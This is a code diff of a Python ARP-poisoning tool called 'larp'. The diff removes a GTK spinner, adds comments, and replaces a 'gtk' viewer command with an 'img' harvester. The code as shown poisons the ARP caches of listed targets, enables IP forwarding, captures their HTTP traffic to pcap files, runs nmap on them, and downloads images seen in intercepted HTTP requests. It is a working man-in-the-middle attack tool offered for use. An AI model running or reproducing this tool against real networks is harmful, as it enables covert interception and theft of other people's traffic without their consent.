@@ -86,12 +86,8 @@ class ImgDisplay(Gtk.Window):
 
         self.box = Gtk.Box(spacing=6)
 
-        self.spinner = Gtk.Spinner()
-        self.spinner_on = True
-
         self.table = Gtk.Table(3, 2, True)
         self.table.attach(self.box, 0, 2, 0, 2)
-        self.table.attach(self.spinner, 0, 2, 0, 1)
 
         self.add(self.table)
         self.spinner.start()
@@ -103,16 +99,6 @@ class ImgDisplay(Gtk.Window):
         image.set_from_file(data)
         self.box.add(image)
         self.box.show_all()
-
-    def triger_spinner(self, widget, spin_status=False):
-
-        if spin_status and self.spinner_on == False:
-            self.spinner.start()
-            self.spinner_on = True
-
-        if spin_status == False and self.spinner_on:
-            self.spinner.stop()
-            self.spinner_on = False
 
     def link_extract(self, packet,http_packet):
 
@@ -133,7 +119,7 @@ class ImgDisplay(Gtk.Window):
         http_packet=str(packet)
         sr = self.link_extract(packet, http_packet)
         if sr is not None:
-            urllib.urlretrieve(sr, "/tmp/" + sr[sr.rfind('/')+1:])
+            urllib.urlretrieve(sr, "/tmp/img/" + sr[sr.rfind('/')+1:])
             #self.update_image(sr[sr.rfind('/')+1:])
 
 #---------------------
@@ -145,32 +131,31 @@ class larp():
 
     def __init__(self, gateway_ip, interface, file_name, v=0):
         # setup all of the variables and the configurations
-        print colored("[*] Starting up...", "green")
-        self.win = ImgDisplay()
-        conf.iface = interface
-        conf.verb = v
-        self.interface = interface
-        self.g_ip = gateway_ip
-        self.interface = interface
-        self.g_mac = get_mac(self.g_ip)
-        self.t_ip = []
-        self.t_mac = dict()         # map ip -> mac addr
-        self.thread_array = []
-        try:            # get all of the ip addr's
-            with open(file_name, "r") as f:
-                temp_ip = f.readlines()
+        print colored("[*] Starting up...", "green")    # startup_msg
+        self.win = ImgDisplay()                         # img display gui
+        conf.iface = interface                          # interface var
+        conf.verb = v                                   # configure verbose mode
+        self.interface = interface                      # save interface
+        self.g_ip = gateway_ip                          # setup gateway_ip
+        self.g_mac = get_mac(self.g_ip)                 # get the gateway mac
+        self.t_ip = []                                  # target_ip list
+        self.t_mac = dict()                             # map ip -> mac addr
+        self.thread_array = []                          # thread array
+        try:                                            # get all of the ip addr's
+            with open(file_name, "r") as f:             # open up the target ip file
+                temp_ip = f.readlines()                 # get teh ip from the file
                 temp_ip = [ x.strip() for x in temp_ip ]
-                f.close()
+                f.close()                               # remove EOL and close file
             with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
                 data = forward_file.read()
-                data = data.strip()
-                forward_file.close()
+                data = data.strip()                     # check if ipv4 forward
+                forward_file.close()                    # is active
             print colored("[^] ip_forward configuration: %s" % data, "blue")
-            if "0" in data:
+            if "0" in data:                             # if data is 0
                 print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
                 , "red")
                 with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                    f.write("1")
+                    f.write("1")                        # modify the ip_forward to on
                     f.close()
             print colored("[*] Retreiving mac addrs", "green")
             for ip in temp_ip:
@@ -181,16 +166,18 @@ class larp():
                     print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                 else:
                     self.t_ip.append(ip)
-                    self.t_mac[ip] = temp
+                    self.t_mac[ip] = temp               # retrieving mac addrs
         except:
             self.error("file provided does not exist and permission error")
         print colored("[*] Setup finished!", "green")
 
     def error(self, msg=""):
+        ''' function to display errors '''
         print >> sys.stderr, colored(msg, 'red')
         sys.exit(-1)
 
     def sniffer(self, target_ip):
+        ''' sniff for http trafic on particular host '''
         bpf_filter = "ip host %s" % target_ip
         os.mkdir("/tmp/larp_%s" % target_ip)
         f_i = 0
@@ -199,27 +186,30 @@ class larp():
             wrpcap('/tmp/larp_%s/larp_sniffer_%s_%d.cap' % (target_ip, target_ip, f_i), packest)
             f_i += 1
 
-    def img_sniff(self, ip="0.0.0.0"):
+    def img_sniff(self):
+        ''' image sniffer function '''
         win = ImgDisplay()
         sniff(iface=self.interface, prn=win.http_header, filter="tcp port 80")
 
     def main(self):
+        ''' main function '''
         t_id = 0    # thread id
         id_map = dict()
         print colored("[*] Main Thread", "green")
         print colored("[^] Starting ARP poison", "blue")
-        for ip in self.t_ip:
+        for ip in self.t_ip:                    # start the arp on every client
             self.thread_array.append(multiprocessing.Process(target=poison,\
             args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
             self.thread_array[t_id].start()
             id_map[t_id] = [ip, self.t_mac[ip], None , None]
-            # id_mapper  ip |  mac addr |  if sniffing|if in gtk
+            # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
             t_id += 1
         print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
         while len(id_map):
-            buf = raw_input('#>')
-            try:
+            buf = raw_input('#>')               # display the prompt
+            try:                                # process all of the comands
                 if "all" in buf or "a" == buf:
+
                     for i in xrange(0, t_id):
                         self.thread_array[i].terminate()
                         restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
@@ -228,27 +218,38 @@ class larp():
                             id_map[i][2].terminate()
                             print colored("[^] Stoped sniffer for %s" % id_map[i][0], "blue")
                         del id_map[i]
+
                 elif "list" in buf or "l" == buf:
+
                     for i in xrange(0, t_id):
                         print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
+
                 elif "sniff" in buf or "s" == buf.split(' ')[0]:
+
                     i = int(buf.split(' ')[1])
                     print colored("[^] Sniffig %d => %s" % (int(buf.split(' ')[1]),id_map[i][0]), "blue")
                     print colored("[!] Sniffer packet stored in files 10 by 10 and it only sniffs for http", "red")
                     id_map[i][2] = multiprocessing.Process( target=self.sniffer,\
                     args=(id_map[i][0],))
                     id_map[i][2].start()
+
                 elif "nmap" in buf or "n" == buf.split(' ')[0]:
+
                     data = 1
                     i = int(buf.split(' ')[1])
                     print colored("[^] running nmap on %d => %s" % (i, id_map[i][0]), "blue")
                     print colored("[*] Output:", "green")
                     os.system("nmap %s" %id_map[i][0])
-                elif "gtk" in buf or "g" == buf.split(' ')[0]:
-                    i = int(buf.split(' ')[1])
-                    print colored("[^] Opening Gtk image viewer for %d => %s" % (i, id_map[i][0]), "blue")
-                    self.img_sniff(id_map[i][0])
+
+                elif "img" in buf or "i" == buf.split(' ')[0]:
+
+                    os.mkdirs('/tmp/img/')
+                    print colored("[^] Opening img harvester", "blue")
+                    p = multiprocessing.Process(target=self.img_sniff, args=())
+                    p.start()
+
                 else:
+
                     self.thread_array[int(buf)].terminate()
                     restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
                     print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
@@ -256,8 +257,10 @@ class larp():
                         id_map[int(buf)][2].termincate()
                         print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
                     del id_map[int(buf)]
+
             except:
-                print colored("[!] Available commands: all - list - sniff - nmap - gtk", "red")
+                print colored("[!] Available commands: all - list - sniff - nmap - img", "red")
+
         for thread in self.thread_array:
             thread.join()
 
